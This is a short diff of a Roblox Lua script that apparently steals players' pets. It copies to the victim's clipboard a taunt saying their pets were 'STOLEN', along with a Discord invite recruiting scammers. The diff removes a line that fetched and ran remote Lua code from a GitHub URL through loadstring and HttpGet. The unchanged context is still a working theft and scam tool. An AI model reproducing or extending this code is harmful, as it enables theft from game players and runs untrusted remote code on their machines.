@@ -25,7 +25,6 @@ getgenv().Username = "dumb"
         local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
         local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
         local TeleportService = game:GetService("TeleportService")
-        local krnlbypass = "https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/KRNL-BYPASS.lua"
 
         local data = DataService:GetData()
         local maxAttempts = 10
@@ -34,8 +33,6 @@ getgenv().Username = "dumb"
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
-        loadstring(game:HttpGet(krnlbypass, true))()
-        
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
                 local servers = {}
